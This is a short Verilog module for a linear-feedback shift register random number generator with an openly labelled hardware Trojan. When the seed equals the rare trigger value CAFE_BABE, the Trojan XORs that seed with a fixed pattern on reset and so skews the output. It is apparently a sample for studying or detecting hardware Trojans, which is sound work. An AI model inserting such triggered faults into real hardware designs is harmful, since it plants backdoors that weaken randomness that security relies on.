module random_with_triggered_fault (
    
    // Inputs
    input                       i_clk,
    input                       i_reset_n,
    input               [31:0]  i_seed,

    // Outputs
    output reg          [7:0]  o_data
);

    /******** Reg declarations ********/
    reg [31:0]  r_data;
    wire        w_xnor;

    /******** Trojan specific declarations ********/
    // Trigger condition for the Trojan: A specific rare seed
    wire trojan_trigger = (i_seed == 32'hCAFE_BABE);
    // Fault injection logic: XOR with a pattern to alter randomness
    reg [31:0]  trojan_pattern = 32'hDEAD_BEEF;

    /******** Conccurrent logic ********/
    assign w_xnor = (r_data[31] ^ ~r_data[29] ^ ~r_data[25] ^ ~r_data[24]);

    /******** Process ********/
    always @(posedge i_clk) begin
        if (!i_reset_n) begin
            // On reset, load the seed; if Trojan triggered, load altered seed
            r_data <= trojan_trigger ? i_seed ^ trojan_pattern : i_seed;
        end else begin
            // Normal random number generation process
            r_data <= {r_data[30:0], w_xnor};
        end
        // Output the least significant 8 bits of the internal state as random data
        o_data <= r_data[7:0];
    end

endmodule
